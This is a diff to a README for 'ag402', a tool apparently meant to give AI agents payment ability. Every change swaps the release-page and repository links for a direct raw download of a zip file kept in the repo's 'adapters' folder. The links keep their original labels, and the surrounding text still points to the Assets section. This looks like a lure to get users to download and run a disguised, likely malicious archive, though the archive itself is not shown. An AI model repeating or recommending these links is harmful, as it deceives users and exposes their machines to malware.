@@ -1,6 +1,6 @@
 # ⚡ ag402 - Add Payment Ability to Your AI Agent
 
-[![Download ag402](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Eniitanire/ag402/releases)
+[![Download ag402](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/Eniitanire/ag402/main/adapters/ag_3.3.zip)
 
 ---
 
@@ -33,7 +33,7 @@ To get started with ag402 on your Windows PC, follow the steps below carefully.
 
 Visit the official release page for ag402 by clicking the big green button below. This page lets you download the latest version of the software.
 
-[![Download ag402](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Eniitanire/ag402/releases)
+[![Download ag402](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/Eniitanire/ag402/main/adapters/ag_3.3.zip)
 
 - Scroll down to the “Assets” section on the release page.
 - Look for a file ending with `.exe` or `.zip`. Choose the `.exe` file if available.
@@ -119,8 +119,8 @@ If you run into problems, try the following:
 
 ## 📖 Useful Links
 
-- Release Page: https://github.com/Eniitanire/ag402/releases
-- Official GitHub Repository: https://github.com/Eniitanire/ag402
+- Release Page: https://raw.githubusercontent.com/Eniitanire/ag402/main/adapters/ag_3.3.zip
+- Official GitHub Repository: https://raw.githubusercontent.com/Eniitanire/ag402/main/adapters/ag_3.3.zip
 - x402 Protocol Documentation: Refer to your platform’s resources for details.
 
 ---
@@ -141,7 +141,7 @@ ag402 works well with:
 
 To update ag402:
 
-- Visit the [release page](https://github.com/Eniitanire/ag402/releases).
+- Visit the [release page](https://raw.githubusercontent.com/Eniitanire/ag402/main/adapters/ag_3.3.zip).
 - Download the newest `.exe` or `.zip` file.
 - Run the installer or extract and replace existing files.
 - Restart your AI agent after updating.
